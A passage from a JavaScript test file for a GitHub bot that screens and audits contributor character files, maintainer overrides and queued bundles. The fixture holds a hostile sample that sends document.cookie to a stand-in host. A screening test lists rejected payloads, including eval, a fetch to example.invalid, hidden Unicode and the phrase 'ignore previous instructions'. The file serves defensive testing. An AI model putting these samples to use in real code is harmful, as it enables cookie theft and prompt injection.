  assert.equal(c.addTemporary(row, "NEW-OOGA"), true);
  assert.equal(c.addTemporary({ ...row, handle: "second" }, "second"), false);
  assert.equal(c.roster[0].name, "alias");
  assert.equal(c.roster.length, 2);
  assert.equal(c.activeRoster[1].temporary, true);
  assert.equal(BL.characters.get("new-ooga").temporary, true);
});


test("verified numeric owner keeps the custom character across renames; old-login claimants fail closed", async () => {
  const lookup = createOwnedCharacterLookup([{ handle: "Bitcoin-Bill", github_login: "Bitcoin-Bill",
    joined_at: "2026-09-01T00:00:00Z", last_commit_at: "2026-10-04T11:00:00Z" }], async () => { throw new Error("Pinned identity must not consult fallback"); });
  for (const login of ["Bitcoin-Bill", "Bitclank-Bill", "BITCLANK-BILL"])
    assert.equal((await lookup(login, 185141343)).handle, "Bitcoin-Bill");
  assert.equal(await lookup("Bitcoin-Bill", 99), null);
  assert.equal(await lookup("Bitcoin-Bill"), null);
});

test("cutover preparation emits nothing until both GitHub lookups verify the renamed numeric account", async () => {
  const { prepareAccountMigration } = await import("../../scripts/account-migration.mjs");
  const input = { id:42, oldLogin:"old-name", newLogin:"new-name", lastOldAt:"2026-11-01T00:00:00.000Z" }, now = Date.parse("2026-11-02T00:00:00Z");
  await assert.rejects(prepareAccountMigration(input,async () => Response.json({ id:42,login:"old-name" }),now),/not verified/);
  await assert.rejects(prepareAccountMigration(input,async url => Response.json({ id:url.includes("user/42")?42:99,login:"new-name" }),now),/different account/);
  const result = await prepareAccountMigration(input,async () => Response.json({ id:42,login:"new-name" }),now);
  assert.equal(result.sql.oogaboogaland.length,2);
  assert.ok(result.sql.oogaboogaland[0].includes("WHERE id=42 AND lower(login)='old-name'"));
  assert.ok(result.sql.oogatron[0].includes(input.lastOldAt));
  await assert.rejects(prepareAccountMigration({ ...input,lastOldAt:"2027-01-01T00:00:00.000Z" },async () => assert.fail(),now),/ISO UTC/);
});


test("activity and public labels use the current owner login, never a reused permanent art handle", () => {
  const context = { window: {}, URLSearchParams, location: { search: "" } };
  for (const name of ["math", "characters", "contributor-identities", "activity-repos"])
    runInNewContext(readFileSync(new URL(`../../src/js/${name}.js`, import.meta.url), "utf8"), context);
  const BL = context.window.BL;
  BL.characters.add({ handle: "Bitcoin-Bill", github: "Bitclank-Bill", display: "Bill", joined: 1, lastCommit: 2 });
  runInNewContext(readFileSync(new URL("../../src/js/contributors.js", import.meta.url), "utf8"), context);
  assert.equal(BL.characters.get("Bitcoin-Bill").handle, "Bitcoin-Bill", "art references stay stable");
  assert.equal(BL.characters.ownedBy("bitcoin-bill"), null);
  assert.equal(BL.characters.displayOfLogin("bitcoin-bill"), "bitcoin-bill");
  assert.equal(BL.characters.displayOfLogin("BITCLANK-BILL"), "Bill");
  const c = BL.contributors, before = c.roster[0].lastCommitAt;
  assert.equal(c.applySnapshot(snapshot(person("Bitcoin-Bill")), NOW), 0);
  assert.equal(c.roster[0].lastCommitAt, before);
  assert.equal(c.roster[0].lastContributionAt, 0);
  assert.equal(c.applySnapshot(snapshot(person("Bitclank-Bill")), NOW), 1);
  assert.equal(c.roster[0].lastCommitAt, Date.parse(person("Bitclank-Bill").last_seen_at));
  assert.equal(c.roster[0].lastContributionAt, c.roster[0].lastCommitAt);
});

// A small in-memory GitHub: commits with trees and ancestry, three-dot compares
// from the merge base, signed bot commits, statuses and comments.
const overrideFixture = () => {
  const repo = "example/land", bot = "private-app[bot]", char = (name) => `src/characters/${name}.js`;
  const custom = (handle, note = "") => `(() => {\n  "use strict";\n  const BL = window.BL;\n  BL.characters.add({\n    handle: "${handle}",\n    joined: 1,\n    lastCommit: 2,\n    dress: { crown(k, v) { v.set(0, 0, 0, k.P.black); } }\n  });\n})();\n${note}`;
  const blob = (source) => digest(source).slice(0, 40);
  const commits = new Map();
  let seq = 1;
  const commit = (parents, changes, author = bot, verified = true) => {
    const id = (seq++).toString(16).padStart(40, "0"), tree = new Map(parents.length ? commits.get(parents[0]).tree : []);
    for (const [path, source] of Object.entries(changes)) source === null ? tree.delete(path) : tree.set(path, source);
    commits.set(id, { tree, parents, author, verified });
    return id;
  };
  const ancestors = (id) => {
    const seen = [], queue = [id];
    while (queue.length) { const next = queue.shift(); if (!seen.includes(next)) { seen.push(next); queue.push(...commits.get(next).parents); } }
    return seen;
  };
  const diff = (a, b) => {
    const before = commits.get(a).tree, after = commits.get(b).tree;
    return [...new Set([...before.keys(), ...after.keys()])].sort().filter((path) => before.get(path) !== after.get(path))
      .map((filename) => ({ filename, status: !before.has(filename) ? "added" : !after.has(filename) ? "removed" : "modified" }));
  };
  const compare = (a, b) => {
    const left = ancestors(a), right = ancestors(b), base = right.find((id) => left.includes(id));
    const ahead = right.filter((id) => !left.includes(id)).reverse();
    return { status: a === b ? "identical" : right.includes(a) ? "ahead" : left.includes(b) ? "behind" : "diverged",
      behind_by: left.filter((id) => !right.includes(id)).length, merge_base_commit: { sha: base },
      total_commits: ahead.length, commits: ahead.map((sha) => ({ sha })), files: diff(base, b) };
  };
  const sources = {
    bad: 'BL.characters.add({ handle: "bad-actor", ...stolen }); fetch("https://example.invalid/" + document.cookie);',
    natalieQueued: 'BL.characters.add({ handle: "natalievarty", handle: "someone-else" });',
    tiffanyQueued: custom("tiffanyvarty", "// original boots\n"), held: custom("held"),
    natalie: custom("natalievarty", "// corrected jaw\n"), tiffany: custom("tiffanyvarty", "// corrected boots\n")
  };
  const f = { repo, bot, char, custom, sources, commits, commit, blob, permission: { maint: "admin" }, statuses: [], comments: new Map(), writes: [], calls: [], updates: [] };
  f.rock = commit([], { [char("kept")]: characterSource({ handle: "kept", joined: 1, lastCommit: 2 }), [char("bad-actor")]: sources.bad, "README.md": "readme\n" });
  const r0 = f.r0 = f.rock;
  const source = (number, login, path, text) => {
    const head = commit([r0], { [path]: text }, login, false);
    return { number, state: "closed", merged_at: null, user: { login, type: "User" }, base: { ref: "rock", repo: { full_name: repo } }, head: { sha: head, ref: "patch-1", repo: { full_name: `${login}/land` } } };
  };
  const natalie = source(483, "natalievarty", char("natalievarty"), sources.natalieQueued), tiffany = source(484, "tiffanyvarty", char("tiffanyvarty"), sources.tiffanyQueued), held = source(9, "held", char("held"), sources.held);
  const entry = (pr, text) => ({ pr: pr.number, head: pr.head.sha, author: pr.user.login, path: diff(r0, pr.head.sha)[0].filename, base: null, hash: digest(text), lane: "manual" });
  f.entries = { natalie: entry(natalie, sources.natalieQueued), tiffany: entry(tiffany, sources.tiffanyQueued), held: entry(held, sources.held) };
  const bundle = (number, lane, entries, files = {}) => {
    const head = commit([r0], { ...files, [manifestPath(lane)]: JSON.stringify({ version: 1, lane, openedOn: "2026-11-03", entries }, null, 2) + "\n" });
    return { number, state: "open", user: { login: bot, type: "Bot" }, base: { ref: "rock", repo: { full_name: repo } }, head: { sha: head, ref: `automation/characters-${lane}-round`, repo: { full_name: repo } } };
  };
  const manual = bundle(450, "manual", [f.entries.natalie, f.entries.tiffany, f.entries.held],
    { [char("natalievarty")]: sources.natalieQueued, [char("tiffanyvarty")]: sources.tiffanyQueued, [char("held")]: sources.held });
  const head = commit([r0], { [char("bad-actor")]: null, [char("natalievarty")]: sources.natalie, [char("tiffanyvarty")]: sources.tiffany }, "maint", false);
  const overridePr = (number, sha, start) => ({ number, start, state: "open", draft: false, merged_at: null, user: { login: "maint", id: 5, type: "User" },
    base: { ref: "rock", repo: { full_name: repo } }, head: { sha, ref: `character-override/pr-${number}`, repo: { full_name: repo } } });
  f.override = overridePr(600, head, r0);
  f.prs = [manual, bundle(451, "daily", []), bundle(452, "rename", []), f.override, natalie, tiffany, held];
  f.manual = manual;
  const pull = (number) => f.prs.find((pr) => pr.number === number);
  // Another maintainer override branched from current rock.
  f.addOverride = (number, changes) => { const pr = overridePr(number, commit([f.rock], changes, "maint", false), f.rock); f.prs.push(pr); return pr; };
  // A contributor revision, queued in the manual bundle by a signed bot commit.
  f.enqueue = (number, login, path, text) => {
    const pr = { number, state: "closed", merged_at: null, user: { login, type: "User" }, base: { ref: "rock", repo: { full_name: repo } },
      head: { sha: commit([f.rock], { [path]: text }, login, false), ref: "patch-2", repo: { full_name: `${login}/land` } } };
    f.prs.push(pr);
    const current = commits.get(f.rock).tree.get(path);
    const queued = { pr: number, head: pr.head.sha, author: login, path, base: current === undefined ? null : blob(current), hash: digest(text), lane: "manual" };
    manual.head.sha = commit([manual.head.sha], { [path]: text, [manifestPath("manual")]: JSON.stringify({ version: 1, lane: "manual", openedOn: "2026-11-03", entries: [...f.manifest(), queued] }) });
    return queued;
  };
  f.merge = (pr = f.override) => {
    const merged = commit([f.rock, pr.head.sha], Object.fromEntries(diff(pr.start, pr.head.sha)
      .map(({ filename }) => [filename, commits.get(pr.head.sha).tree.get(filename) ?? null])), "maint");
    Object.assign(pr, { state: "closed", merged_at: "2026-11-07T00:00:00Z", merge_commit_sha: merged });
    f.rock = merged;
  };
  f.gh = { repo,
    tree: async (ref) => new Map([...commits.get(ref).tree].map(([path, text]) => [path, { sha: blob(text) }])),
    file: async (ref, path) => { const text = commits.get(ref).tree.get(path); return text === undefined ? null : { source: text, sha: blob(text) }; },
    commit: async (branch, expected, additions, deletions, message) => {
      const pr = f.prs.find((row) => row.head.ref === branch);
      assert.equal(pr.head.sha, expected);
      pr.head.sha = commit([expected], Object.fromEntries([...additions.map((file) => [file.path, file.source]), ...deletions.map((path) => [path, null])]));
      f.writes.push({ branch, additions, deletions, message });
      return pr.head.sha;
    },
    list: async (url) => {
      if (url === "pulls?state=open&base=rock") return f.prs.filter((pr) => pr.state === "open");
      if (/^issues\/\d+\/comments$/.test(url)) return f.comments.get(Number(url.split("/")[1])) || [];
      if (/^commits\/[a-f0-9]{40}\/statuses$/.test(url)) return f.statuses.filter((row) => row.sha === url.split("/")[1]).reverse();
      if (/^pulls\/\d+\/files$/.test(url)) { const pr = pull(Number(url.split("/")[1])); return diff(pr.start, pr.head.sha); }
      if (url.endsWith("/reviews")) return [];
      throw new Error(`Unexpected list ${url}`);
    },
    api: async (url, method = "GET", data) => {
      f.calls.push({ url, method });
      if (url === "git/ref/heads/rock") return { object: { sha: f.rock } };
      if (/^pulls\/\d+$/.test(url)) { const pr = pull(Number(url.split("/")[1])); if (method === "PATCH") Object.assign(pr, data); return structuredClone(pr); }
      if (/^pulls\/\d+\/update-branch$/.test(url)) { f.updates.push(url); return {}; }
      if (url.startsWith("collaborators/")) { const level = f.permission[decodeURIComponent(url.split("/")[1])] || "read"; return { permission: level, role_name: level }; }
      if (url.startsWith("compare/")) { const [a, b] = url.slice(8).split("..."); return compare(a, b); }
      if (url.startsWith("commits/")) {
        const sha = url.slice(8).split("?")[0], row = commits.get(sha);
        return { author: { login: row.author }, parents: row.parents.map((id) => ({ sha: id })), files: row.parents.length ? diff(row.parents[0], sha) : [], commit: { verification: { verified: row.verified } } };
      }
      if (url.startsWith("statuses/")) { f.statuses.push({ sha: url.slice(9), ...data, creator: { login: f.statusCreator || bot } }); return {}; }
      if (/^issues\/\d+\/comments$/.test(url)) { const n = Number(url.split("/")[1]); f.comments.set(n, [...f.comments.get(n) || [], { user: { login: bot }, body: data.body }]); return {}; }
      throw new Error(`Unexpected request ${method} ${url}`);
    }
  };
  f.coordinator = createCoordinator(f.gh, bot, () => new Date(NOW));
  f.gate = (context = "Character intake") => f.statuses.filter((row) => row.sha === f.override.head.sha && row.context === context).at(-1);
  f.manifest = () => JSON.parse(commits.get(manual.head.sha).tree.get(manifestPath("manual"))).entries;
  return f;
};

test("regression: ordinary PR checks bypass the writer queue only with complete current metadata and no queued work", async (t) => {
  const fixture = () => {
    const f = overrideFixture();
    f.ordinary = f.addOverride(700, { "README.md": "updated readme\n" });
    f.ordinary.head.ref = "feature/readme";
    f.inspect = () => f.coordinator.needsWriter(700);
    f.states = () => f.statuses.filter((row) => row.sha === f.ordinary.head.sha);
    return f;
  };
  await t.test("unrelated hostile custom code stays unread; only the two intake statuses are written", async () => {
    const f = fixture(), file = f.gh.file;
    f.gh.file = async (ref, path) => { assert.ok(path.startsWith(".github/character-bundles/")); return file(ref, path); };
    assert.equal(await f.inspect(), false);
    for (const context of ["Character intake", "Character bundle safety"]) assert.equal(f.states().filter((row) => row.context === context).at(-1).state, "success");
    assert.ok(f.calls.filter((row) => row.method !== "GET").every((row) => row.url.startsWith("statuses/")));
    assert.equal(f.writes.length + f.updates.length, 0);
  });
  await t.test("new and renamed character paths, existing queued entries, bundles and overrides still use the writer", async () => {
    const f = fixture();
    f.ordinary.head.sha = f.commit([f.rock], { [f.char("new")]: f.custom("new") }, "maint", false);
    assert.equal(await f.inspect(), true);
    assert.equal(await f.coordinator.needsWriter(f.manual.number), true);
    assert.equal(await f.coordinator.needsWriter(f.override.number), true);
    const api = f.gh.api;
    f.gh.api = async (url, ...args) => url.startsWith("compare/")
      ? { merge_base_commit: { sha: f.rock }, files: [{ filename: "retired.js", previous_filename: f.char("new"), status: "renamed" }] }
      : api(url, ...args);
    assert.equal(await f.inspect(), true, "moving a character out of the directory is still a character change");
    const queued = fixture(), entries = queued.manifest();
    entries[0].pr = 700;
    queued.manual.head.sha = queued.commit([queued.manual.head.sha], { [manifestPath("manual")]: JSON.stringify({ version: 1, lane: "manual", openedOn: "2026-11-03", entries }) });
    assert.equal(await queued.inspect(), true, "a source that restored its character files still needs queue inspection");
    assert.ok(queued.states().every((row) => row.state === "pending"));
  });
  await t.test("writers leave required intake and bundle statuses pending while deferred, including sweeps and overrides", async () => {
    const f = fixture();
    for (const pr of [f.manual, f.override, f.ordinary]) {
      await f.coordinator.holdForWriter({ pull_request: { number: pr.number } });
      for (const context of ["Character intake", "Character bundle safety"]) {
        assert.equal(f.statuses.filter(row => row.sha === pr.head.sha && row.context === context).at(-1).state, "pending");
      }
    }
    const count = f.statuses.length;
    f.ordinary.state = "closed";
    await f.coordinator.holdForWriter({ pull_request: { number: f.ordinary.number } });
    assert.equal(f.statuses.length, count);
    await f.coordinator.holdForWriter({});
    const held = f.statuses.slice(count);
    assert.equal(held.length, 6, "the three open automation bundles are held by a sweep");
    assert.ok(held.every(row => row.state === "pending"));
    assert.equal(f.writes.length + f.updates.length, 0, "holding a writer never mutates code or PRs");
  });
  await t.test("push signals hold only their open rock PRs and leave unrelated green bundles mergeable", async () => {
    const f = fixture(), list = f.gh.list;
    const contexts = ["Character intake", "Character bundle safety"];
    for (const pr of f.prs.filter(pr => pr.head.ref.startsWith("automation/characters-"))) {
      for (const context of contexts) f.statuses.push({ sha: pr.head.sha, context, state: "success" });
    }
    const green = structuredClone(f.statuses);
    const run = { event: "push", head_branch: f.ordinary.head.ref, head_sha: f.ordinary.head.sha, head_repository: { full_name: f.repo } };
    const closed = { ...f.ordinary, state: "closed", head: { sha: "closed" } };
    const otherBase = { ...f.ordinary, base: { ref: "other" }, head: { sha: "other-base" } };
    f.gh.list = async url => url === `commits/${run.head_sha}/pulls` ? [f.ordinary, closed, otherBase] : list(url);
    await f.coordinator.holdForWriter({ workflow_run: run });
    assert.deepEqual(f.statuses.slice(0, green.length), green);
    assert.deepEqual(f.statuses.slice(green.length).map(row => [row.sha, row.context, row.state]),
      contexts.map(context => [f.ordinary.head.sha, context, "pending"]));
    const held = structuredClone(f.statuses);
    for (const signal of [
      { ...run, head_branch: "rock" },
      { ...run, head_branch: "automation/characters-daily-round" },
      { ...run, head_repository: { full_name: "someone/fork" } },
      { ...run, event: "pull_request" }
    ]) await f.coordinator.holdForWriter({ workflow_run: signal });
    f.gh.list = async url => url === `commits/${run.head_sha}/pulls` ? [] : list(url);
    await f.coordinator.holdForWriter({ workflow_run: run });
    await f.coordinator.holdForWriter({ inputs: { override_pr: "600" } });
    assert.deepEqual(f.statuses, held, "audits, ignored signals, standalone pushes and targeted recovery do not hold bundles");
    await f.coordinator.holdForWriter({ workflow_run: { event: "pull_request_review" } });
    assert.deepEqual(f.statuses.slice(held.length).map(row => [row.sha, row.context, row.state]),
      green.map(row => [row.sha, row.context, "pending"]), "review refreshes still hold every bundle they revalidate");
    assert.equal(f.writes.length + f.updates.length, 0);
  });
  await t.test("drafts wait and ordinary closures do not enqueue writes; merged overrides retain cleanup", async () => {
    const f = fixture(); f.ordinary.draft = true;
    assert.equal(await f.inspect(), false);
    assert.ok(f.states().every((row) => row.state === "pending"));
    f.ordinary.state = "closed";
    assert.equal(await f.inspect(), false);
    f.merge();
    assert.equal(await f.coordinator.needsWriter(f.override.number), true);
  });
  await t.test("truncated comparisons, API failure and missing or untrusted manifests never pass", async () => {
    for (const fault of ["truncated", "api", "missing", "unsigned", "malformed"]) {
      const f = fixture(), api = f.gh.api, file = f.gh.file;
      f.gh.api = async (url, ...args) => {
        if (url.startsWith("compare/")) {
          if (fault === "api") throw new Error("API unavailable");
          if (fault === "truncated") return { merge_base_commit: { sha: f.rock }, files: Array.from({ length: 300 }, () => ({ filename: "README.md" })) };
        }
        return api(url, ...args);
      };
      if (fault === "missing") f.gh.file = async () => null;
      if (fault === "malformed") f.gh.file = async () => ({ source: "not JSON" });
      if (fault === "unsigned") f.commits.get(f.manual.head.sha).verified = false;
      await assert.rejects(f.inspect());
      assert.ok(!f.states().some((row) => row.state === "success"), fault);
      for (const context of ["Character intake", "Character bundle safety"]) assert.equal(f.states().filter((row) => row.context === context).at(-1).state, "failure", fault);
      assert.equal(f.writes.length, 0);
      f.gh.file = file;
    }
  });
  await t.test("a changed PR head, base or bundle head goes back through serialized inspection", async () => {
    for (const moving of ["pr", "rock", "bundle"]) {
      const f = fixture(), list = f.gh.list;
      let lists = 0;
      f.gh.list = async (url) => {
        const rows = structuredClone(await list(url));
        if (++lists === 1) {
          if (moving === "pr") f.ordinary.head.sha = f.commit([f.rock], { [f.char("new")]: f.custom("new") });
          if (moving === "rock") f.rock = f.commit([f.rock], { "README.md": "new base\n" });
          if (moving === "bundle") f.manual.head.sha = f.commit([f.manual.head.sha], {});
        }
        return rows;
      };
      assert.equal(await f.inspect(), true, moving);
      assert.ok(!f.statuses.some((row) => row.state === "success"), moving);
    }
  });
});

test("a maintainer override PR is verified and audited without parsing replaced sources or touching the queue before merge", async () => {
  const f = overrideFixture();
  // The queued Natalie revision is unreadable as an identity; ordinary readers still refuse it.
  await assert.rejects(queuedCharacters(f.gh, f.bot), /Character fields|literal/);
  await f.coordinator.intake({ pr: 600 });
  assert.equal(f.gate().state, "success");
  assert.ok(f.gate().description.startsWith(OVERRIDE_VERIFIED));
  assert.equal(f.gate("Character bundle safety").state, "success");
  const audit = f.comments.get(600)[0].body;
  assert.match(audit, new RegExp(`exact head ${f.override.head.sha}`));
  assert.match(audit, /removed src\/characters\/bad-actor\.js \(was blob [a-f0-9]{40}\)/);
  assert.match(audit, /added src\/characters\/natalievarty\.js: blob [a-f0-9]{40}, sha256 [a-f0-9]{64}, owner natalievarty/);
  for (const entry of [f.entries.natalie, f.entries.tiffany]) assert.ok(audit.includes(`#${entry.pr} at ${entry.head} by ${entry.author}`));
  assert.ok(!audit.includes("held.js"), "unrelated queued work is not superseded");
  // Nothing was extracted, closed or rewritten; only statuses and the audit comment.
  assert.equal(f.writes.length, 0);
  assert.equal(f.override.state, "open");
  assert.ok(f.calls.filter((call) => call.method !== "GET").every((call) => call.url.startsWith("statuses/") || call.url === "issues/600/comments"));
  await f.coordinator.intake({ pr: 600 });
  assert.equal(f.comments.get(600).length, 1, "an unchanged audit is not repeated");
  // A pinned account's rename check never overwrites an override's statuses.
  assert.equal(await f.coordinator.accountRename(600), false);
});

test("maintainer overrides refuse nonmaintainers, forks, bots, drafts, mixed or stale diffs, bad new sources and lost permission", async () => {
  const denied = async (change, pattern, state = "failure") => {
    const f = overrideFixture();
    await change(f);
    await f.coordinator.intake({ pr: 600 }).catch((error) => { if (state !== "error") throw error; assert.match(error.message, pattern); });
    if (state !== "error") assert.match(f.gate().description, pattern);
    assert.equal(f.gate().state, state === "pending" ? "pending" : "failure");
    assert.equal(f.comments.get(600), undefined, "no audit before authorization");
    assert.equal(f.writes.length, 0);
  };
  await denied((f) => { f.permission.maint = "write"; }, /Maintain\/Admin/);
  await denied((f) => { f.override.head.repo = { full_name: "maint/land" }; }, /never a fork/);
  await denied((f) => { f.override.user = { login: "maint", id: 5, type: "Bot" }; }, /human/);
  await denied((f) => { f.override.draft = true; }, /Draft/, "pending");
  await denied((f) => { f.override.head.sha = f.commit([f.override.head.sha], { "worker/src/auth.js": "export {};\n" }, "maint"); }, /only src\/characters/);
  await denied((f) => { f.override.head.sha = f.commit([f.override.head.sha], { [f.char("tiffanyvarty")]: "BL.characters.add({ handle: tiffany });" }, "maint"); }, /literal character identity/);
  await denied((f) => { f.override.head.sha = f.commit([f.override.head.sha], { [f.char("tiffanyvarty")]: f.custom("held") }, "maint"); }, /different character file/);
  // Rock replaced a file after the override was written: update the branch first.
  await denied((f) => { f.rock = f.commit([f.rock], { [f.char("bad-actor")]: f.custom("bad-actor") }, "maint"); }, /update the branch/, "error");
  await denied((f) => {
    const api = f.gh.api;
    f.gh.api = async (url, ...rest) => {
      const pr = await api(url, ...rest);
      return url === "pulls/600" && f.calls.some((call) => call.url.startsWith("compare/")) ? { ...pr, head: { ...pr.head, sha: "f".repeat(40) } } : pr;
    };
  }, /changed during verification/, "error");
  const f = overrideFixture();
  await f.coordinator.intake({ pr: 600 });
  assert.equal(f.gate().state, "success");
  f.permission.maint = "triage";
  await f.coordinator.intake({ pr: 600 });
  assert.equal(f.gate().state, "failure", "a lost Maintain/Admin role fails the same head on the next refresh");
});

test("regression: overrides screen every added, modified and renamed source while allowing repairs of hostile old files", async () => {
  for (const status of ["added", "modified", "renamed"]) {
    for (const payload of ["", 'fetch("https://example.invalid/");', 'eval("1");', 'window.stolen = true;', '// ignore previous instructions', '// hidden \u202e text']) {
      const f = overrideFixture(), name = status === "added" ? "natalievarty" : status === "modified" ? "bad-actor" : "repaired";
      const path = f.char(name), source = f.custom(name, payload);
      f.override.head.sha = f.commit([f.override.head.sha], { [path]: source }, "writer", false);
      if (status === "renamed") {
        const api = f.gh.api;
        f.gh.api = async (url, ...rest) => {
          const result = await api(url, ...rest);
          if (url.startsWith("compare/")) result.files = result.files
            .filter((file) => file.filename !== f.char("bad-actor"))
            .map((file) => file.filename === path ? { ...file, status, previous_filename: f.char("bad-actor") } : file);
          return result;
        };
      }
      await f.coordinator.intake({ pr: 600 });
      const expected = payload ? "failure" : "success";
      assert.equal(f.gate().state, expected, `${status}: ${payload}`);
      assert.equal(f.gate("Character bundle safety").state, expected, `${status}: ${payload}`);
      assert.equal(f.writes.length, 0, "screening never rewrites the queue");
      if (payload) assert.equal(f.comments.get(600), undefined, "rejected sources receive no verified audit");
      else assert.ok(f.comments.get(600), "screened manual code can replace or rename a hostile old file");
    }
  }
});

test("after a verified override merges, only the revisions it replaced leave their bundle, idempotently", async () => {
  const f = overrideFixture();
  await f.coordinator.intake({ pr: 600 });
  f.merge();
  // Onboarding may run first: the stale unreadable revision reserves nothing; the rest still do.
  assert.deepEqual((await queuedCharacters(f.gh, f.bot, f.rock)).map((row) => row.path), [f.char("tiffanyvarty"), f.char("held")]);
  const withdrawn = await f.coordinator.reconcileOverride(600);
  assert.deepEqual(withdrawn.map((entry) => entry.pr), [483, 484]);
  assert.equal(f.writes.length, 1);
  const [write] = f.writes;
  assert.equal(write.branch, f.manual.head.ref);
  assert.deepEqual(write.deletions.sort(), [f.char("natalievarty"), f.char("tiffanyvarty")]);
  assert.deepEqual(write.additions.map((file) => file.path), [manifestPath("manual")]);
  for (const entry of [f.entries.natalie, f.entries.tiffany]) assert.ok(write.message.includes(`#${entry.pr} at ${entry.head} by ${entry.author}, sha256 ${entry.hash}`));
  assert.ok(write.message.includes(f.override.merge_commit_sha));
  assert.deepEqual(f.manifest(), [f.entries.held], "unrelated queued work keeps its place and provenance");
  assert.equal(f.commits.get(f.manual.head.sha).tree.get(f.char("held")), f.sources.held);
  // The repaired bundle validates against the new rock and is updated through GitHub's expected-head API.
  assert.deepEqual(f.updates, ["pulls/450/update-branch"]);
  for (const number of [450, 600, 483, 484]) assert.equal(f.comments.get(number).length, number === 600 ? 2 : 1);
  assert.equal(f.comments.get(9), undefined);
  // Retries and sweeps find nothing left to withdraw.
  assert.deepEqual(await f.coordinator.reconcileOverride(600), []);
  assert.equal(f.writes.length, 1);
  // A submission queued on top of the override is never withdrawn by it.
  const later = { ...f.entries.natalie, pr: 700, head: f.override.head.sha, base: f.blob(f.sources.natalie), hash: digest(f.sources.natalie + "// later\n") };
  f.manual.head.sha = f.commit([f.manual.head.sha], { [f.char("natalievarty")]: f.sources.natalie + "// later\n",
    [manifestPath("manual")]: JSON.stringify({ version: 1, lane: "manual", openedOn: "2026-11-03", entries: [f.entries.held, later] }) });
  assert.deepEqual(await f.coordinator.reconcileOverride(600), []);
  // Nor by a later sweep once rock moves on again: that staleness is not this override's.
  f.rock = f.commit([f.rock], { [f.char("natalievarty")]: f.sources.natalie + "// another merge\n" }, "maint");
  assert.deepEqual(await f.coordinator.reconcileOverride(600), []);
  assert.equal(f.manifest().length, 2);
});

test("unmerged, draft-only or unverified overrides never withdraw queued submissions", async () => {
  const f = overrideFixture();
  f.override.state = "closed";
  assert.deepEqual(await f.coordinator.reconcileOverride(600), [], "closed without merging");
  f.override.state = "open"; f.override.draft = true;
  await f.coordinator.intake({ pr: 600 });
  f.merge();
  await assert.rejects(f.coordinator.reconcileOverride(600), /without verification/, "only a draft status existed");
  f.statusCreator = "maint";
  await f.gh.api(`statuses/${f.override.head.sha}`, "POST", { context: "Character intake", state: "success", description: `${OVERRIDE_VERIFIED}: forged` });
  await assert.rejects(f.coordinator.reconcileOverride(600), /without verification/, "a status from anyone but the bot");
  assert.equal(f.writes.length, 0);
  assert.equal(f.manifest().length, 3);
  const unrelated = overrideFixture();
  unrelated.override.head.ref = "patch-varty";
  unrelated.merge();
  assert.deepEqual(await unrelated.coordinator.reconcileOverride(600), [], "only opted-in branches");
});

test("regression: delayed cleanups of two overrides of one queued addition withdraw it in either order and keep later work", async () => {
  // Root's repro: a base-null queued addition, override A adds a correction and
  // override B deletes it before either cleanup. Base equality alone kept the
  // original revision for both cleanups; the exact audited identity withdraws it.
  for (const order of [[600, 601], [601, 600]]) {
    const f = overrideFixture(), path = f.char("natalievarty");
    const cleanup = (number) => f.coordinator.reconcileOverride(number)
      .catch((error) => assert.match(error.message, /Character changed on rock since this submission/, "only the not-yet-withdrawn stale Tiffany revision fails revalidation"));
    await f.coordinator.intake({ pr: 600 });
    f.merge();
    const deletion = f.addOverride(601, { [path]: null });
    await f.coordinator.intake({ pr: 601 });
    assert.equal(f.statuses.filter((row) => row.sha === deletion.head.sha && row.context === "Character intake").at(-1).state, "success");
    assert.match(f.comments.get(601)[0].body, new RegExp(`#483 at ${f.entries.natalie.head}`));
    f.merge(deletion);
    await cleanup(order[0]);
    assert.ok(!f.manifest().some((entry) => entry.pr === 483), `${order}: the first cleanup withdraws the original revision`);
    // A valid resubmission queued on rock without the file is later work, not superseded.
    const later = f.enqueue(700, "natalievarty", path, f.custom("natalievarty", "// resubmitted\n"));
    assert.equal(later.base, null);
    await cleanup(order[1]);
    for (const number of order) assert.deepEqual(await f.coordinator.reconcileOverride(number), [], `${order}: retries withdraw nothing more`);
    assert.deepEqual(f.manifest().map((entry) => entry.pr), [9, 700]);
    assert.equal(f.commits.get(f.manual.head.sha).tree.get(path), f.custom("natalievarty", "// resubmitted\n"));
  }
});

test("cleanup trusts only the bot's own audit record bound to its verified status", async () => {
  const f = overrideFixture();
  await f.coordinator.intake({ pr: 600 });
  const description = f.gate().description, [audit] = f.comments.get(600), original = audit.body;
  assert.match(description, /, record [a-f0-9]{64}$/);
  assert.ok(description.length <= 140);
  f.merge();
  audit.body = original.replace(/"entries":\["[a-f0-9]{64}"/, `"entries":["${"0".repeat(64)}"`);
  await assert.rejects(f.coordinator.reconcileOverride(600), /missing or altered/, "an edited bot comment");
  f.comments.set(600, [{ user: { login: "maint" }, body: original }]);
  await assert.rejects(f.coordinator.reconcileOverride(600), /missing or altered/, "a faithful copy by another account");
  f.comments.set(600, [{ user: { login: f.bot }, body: original }]);
  f.statusCreator = "maint";
  await f.gh.api(`statuses/${f.override.head.sha}`, "POST", { context: "Character intake", state: "success", description });
  await assert.rejects(f.coordinator.reconcileOverride(600), /without verification/, "a copied status from another account");
  assert.equal(f.writes.length, 0);
  f.statusCreator = null;
  await f.gh.api(`statuses/${f.override.head.sha}`, "POST", { context: "Character intake", state: "success", description });
  assert.deepEqual((await f.coordinator.reconcileOverride(600)).map((entry) => entry.pr), [483, 484]);
});

test("role loss or a rock update during an override scan fails closed instead of passing", async () => {
  const f = overrideFixture(), api = f.gh.api;
  let checks = 0;
  f.gh.api = async (url, ...rest) => {
    if (url.startsWith("collaborators/") && ++checks > 1) f.permission.maint = "write";
    return api(url, ...rest);
  };
  await f.coordinator.intake({ pr: 600 });
  assert.equal(checks, 2, "permission is read again just before publishing success");
  assert.equal(f.gate().state, "failure");
  assert.ok(!f.statuses.some((row) => row.state === "success"));
  const g = overrideFixture(), list = g.gh.list;
  g.gh.list = async (url) => {
    if (url === "pulls?state=open&base=rock") g.rock = g.commit([g.rock], { "README.md": "moved\n" }, "maint");
    return list(url);
  };
  await assert.rejects(g.coordinator.intake({ pr: 600 }), /rock changed during verification/);
  assert.equal(g.gate().state, "failure");
});

test("override paths are character-only and include both sides of a rename", () => {
  const { changes, touched } = overridePaths([{ filename: "src/characters/new.js", previous_filename: "src/characters/old.js", status: "renamed" },
    { filename: "src/characters/gone.js", status: "removed" }]);
  assert.deepEqual([...touched].sort(), ["src/characters/gone.js", "src/characters/new.js", "src/characters/old.js"]);
  assert.deepEqual(changes.map((change) => [change.path, change.previous]), [["src/characters/new.js", "src/characters/old.js"], [null, "src/characters/gone.js"]]);
